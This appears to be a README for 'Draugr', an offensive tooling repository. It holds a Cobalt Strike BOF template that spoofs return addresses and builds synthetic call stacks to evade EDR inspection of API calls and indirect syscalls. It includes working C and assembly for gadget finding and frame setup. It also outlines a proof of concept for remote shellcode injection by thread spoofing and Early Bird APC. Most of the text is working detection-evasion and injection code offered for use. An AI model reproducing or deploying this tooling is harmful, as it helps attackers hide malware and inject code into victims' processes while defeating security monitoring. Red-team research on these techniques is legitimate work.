# Draugr

![Draugr](img/draugr.jpg)

# Introduction

## Draugr-Template

CobaltStrike BOF Template to easily perform a synthetic stack frame in BOF.

The spoofer is based on LoudSunRun.

For each API call, a gadget is randomly used inside KERNELBASE.DLL.

## Draugr-Strike

Example of usage of Draugr-Template with BOF to perform remote process injection.

# Details

## Draugr-Template

Nowadays, some EDRs analyze the stack frame for sensitive API calls, such as memory usage. If the origin of the API call comes from an executable region that is not backed by the disk, it follows the typical shellcode pattern, and you may be detected by the EDR.

It is possible to spoof the return address to evade detection, but your stack frame may still appear suspicious because, after the gadget, there is nothing left. With this implementation, return address spoofing is used, and after the gadget, two frames are pushed to mimic a thread start.

The advantage of a synthetic stack frame is its execution speed and the ability to retrieve the return value of an API call unlike thread pool techniques, which are slower and do not allow retrieving function return values.


### How to use

You need to dynamically resolve the address of the targeted function and call it using the SPOOF_CALL macro like this:

- API Call :

```C
HMODULE pKernel32 = GetModuleHandleA("Kernel32.dll");

void* pVirtualALloc = (void*)GetProcAddress(pKernel32, "VirtualAlloc");

	lpAddressVirtualAlloc = SPOOF_CALL(&stackFrame, pVirtualAlloc, NO_SYCALL, NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
```
- Indirect Syscall :

    - You need to add the targeted function in Syscalls.h
    - Solve jmp addr and SSN in Syscalls.c 

        ```C
        if (!
            HalosGate(GetProcAddress(hModNtdll, "NtAllocateVirtualMemory"), &NtFunc->NtAllocateVirtualMemory.wSyscall, &NtFunc->NtAllocateVirtualMemory.pJmpAddr)
        )
            return FALSE;
        ```
    - Call function 

        ```C
          	NTSTATUS status = SPOOF_CALL(&stackFrame, ntFunc.NtAllocateVirtualMemory.pJmpAddr, ntFunc.NtAllocateVirtualMemory.wSyscall, (HANDLE)-1, &lpAddressNtAlloc, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
        ```


The first argument is a pointer to the ```SYNTHETIC_STACK_FRAME``` structure, and the second is the ```address of the function```.

The ```SYNTHETIC_STACK_FRAME``` structure is an abstraction of the ```PRM``` structure, allowing easier modification of the gadget and frame.

### Custom gadget

For the customization of the gadget ```jmp [RBX]``` or the fake stack frame, you need to edit the code in ```src/core/Spoof.c```, specifically in the ```InitFrameInfo``` function.

You can modify the module used to find the gadget as well as the fake frame.



```C
BOOL InitFrameInfo(
    _In_	PSYNTHETIC_STACK_FRAME	stackFrame
)
{
    void* pModuleFrame1 = GetModuleHandleA("Kernel32.dll"); 
    void* pModuleFrame2 = GetModuleHandleA("Ntdll.dll");        
    void* pModuleGadget = GetModuleHandleA("Kernelbase.dll");   --> Module name use to find gadget

    if (
        !pModuleFrame1 || !pModuleFrame2 || !pModuleGadget
        )
        return FALSE;

    stackFrame->frame1.pModuleAddr = pModuleFrame1;
    stackFrame->frame1.pFunctionAddr = (PVOID)GetProcAddress((HMODULE)pModuleFrame1, "BaseThreadInitThunk");    --> Edit this to change the fake 1st frame
    stackFrame->frame1.dwOffset = 0x14;

    stackFrame->frame2.pModuleAddr = pModuleFrame2;
    stackFrame->frame2.pFunctionAddr = (PVOID)GetProcAddress((HMODULE)pModuleFrame2, "RtlUserThreadStart");     --> Edit this to change the fake 2nd frame
    stackFrame->frame2.dwOffset = 0x21;

    if (
        !stackFrame->frame1.pFunctionAddr || !stackFrame->frame2.pFunctionAddr
        )
        return FALSE;


	stackFrame->pGadget = pModuleGadget;	// Address of module for gadget
   
    if (!stackFrame->pGadget)
        return FALSE;

    return TRUE;
}
```

If you want to use a gadget other than ``` jmp [RBX]```, you need to modify the condition inside the ```FindGadget``` function and update ```Utils.s``` in ```src/asm/Utils.s``` to use the targeted register.

```
l.121 -> 124

mov    [rdi + 16], rbx             ; original rbx is stored into "rbx" member
lea    rbx, [rel fixup]            ; Fixup address is moved into rbx
mov    [rdi], rbx                  ; Fixup member now holds the address of Fixup
mov    rbx, rdi                    ; Address of param struct (Fixup) is moved into rbx


l.135 -> 142

mov     rcx, rbx
add     rsp, 0x200          ; Big frame thing
add     rsp, [rbx + 48]     ; Stack size
add     rsp, [rbx + 32]     ; Stack size
add     rsp, [rbx + 56]     ; Stack size

mov     rbx, [rcx + 16]     ; Restoring OG RBX
```

When you make an API call using the ```SPOOF_CALL``` macro, the function searches for a gadget in the module specified in ```InitFrameInfo```.

This part of the code can be improved by using a linked list to store all gadgets instead of limiting it to 10. Alternatively, it could allocate a buffer to store all gadgets and then list them again.

However, the limit of 10 gadgets is sufficient.
```C
PVOID FindGadget(
	_In_	PVOID	pModuleAddr
)
{
	DWORD	dwTextSectionSize = 0;
	DWORD	dwTextSectionVa = 0;
    PVOID   pGadgetList[10] = { 0 };
    DWORD   dwCounter = 0;

	if (!
		GetTextSectionSize(pModuleAddr, &dwTextSectionVa, &dwTextSectionSize)
		)
		return NULL;


	PVOID pModTextSection = (PBYTE)((UINT_PTR)pModuleAddr + dwTextSectionVa);
	for (int i = 0; i < (dwTextSectionSize - 2); i++)
	{
		if (
			((PBYTE)pModTextSection)[i] == 0xFF &&
			((PBYTE)pModTextSection)[i + 1] == 0x23
			)
		{
  			pGadgetList[dwCounter] = (void*)((UINT_PTR)pModTextSection + i);
            dwCounter++;
            if(dwCounter == 10)
                break;
            
		}
	}

    ULONG seed = 0x1337;
    ULONG randomnNbr = RtlRandomEx(&seed);
    randomnNbr %= dwCounter;
    
	return pGadgetList[randomnNbr];
}
```

## Stackframe

Stackframe example with function call :
- Indirect Syscall with NtAllocateVirtualMemory  :

```
00 00000000`00dcf658 00007ffa`78ea6658     ntdll!NtAllocateVirtualMemory+0x12
01 00000000`00dcf660 00007ffa`78f2c069     KERNELBASE!VirtualAlloc+0x48
02 00000000`00dcf6a0 00007ffa`79f27374     KERNELBASE!wil_details_GetCurrentFeatureEnabledState+0xd9
03 00000000`00dcf700 00007ffa`7b41cc91     KERNEL32!BaseThreadInitThunk+0x14
04 00000000`00dcf730 00000000`00000000     ntdll!RtlUserThreadStart+0x21
```

- VirtualAlloc :

```
00 00000000`00dcf658 00007ffa`78ea6658     ntdll!NtAllocateVirtualMemory+0x12
01 00000000`00dcf660 00007ffa`78f2c069     KERNELBASE!VirtualAlloc+0x48
02 00000000`00dcf6a0 00007ffa`79f27374     KERNELBASE!wil_details_GetCurrentFeatureEnabledState+0xd9
03 00000000`00dcf700 00007ffa`7b41cc91     KERNEL32!BaseThreadInitThunk+0x14
04 00000000`00dcf730 00000000`00000000     ntdll!RtlUserThreadStart+0x21
```

- VirtualFree :

```
00 00000000`00dcf688 00007ffa`78f24061     KERNEL32!VirtualFreeStub
01 00000000`00dcf690 00007ffa`79f27374     KERNELBASE!WerpGetHeaderFromProcess+0x547b9
02 00000000`00dcf700 00007ffa`7b41cc91     KERNEL32!BaseThreadInitThunk+0x14
03 00000000`00dcf730 00000000`00000000     ntdll!RtlUserThreadStart+0x21
```

### Credit

- https://www.unknowncheats.me/forum/anti-cheat-bypass/268039-x64-return-address-spoofing-source-explanation.html
- https://github.com/susMdT/LoudSunRun
- https://github.com/WithSecureLabs/CallStackSpoofer


## Draugr-Strike

### Draugr-Strike

!! WARNING !!

Sometimes the injection fails. This code is just a PoC to demonstrate how to use the template. Use it with precaution !

This example uses kernel32 with a synthetic stack frame to execute shellcode in a remote process.

- Allocate memory with RW permissions with.
- Write shellcode into the remote process.
- Change memory protection to RX.

- Threadspoof :
    - Create a spoofed thread at ```RtlUserThreadStart+0x21```.
    - Resume the thread.
- Earlybird :
    - Add an APC on created thread to execute shellcode
    - Resume thread

Compilation :

- build thradspoof
- build earlybird

Support implicit and explicit injction

More information :

https://www.cobaltstrike.com/blog/process-injection-update-in-cobalt-strike-4-5


### Credit

- https://www.unknowncheats.me/forum/anti-cheat-bypass/268039-x64-return-address-spoofing-source-explanation.html
- https://github.com/susMdT/LoudSunRun
- https://github.com/WithSecureLabs/CallStackSpoofer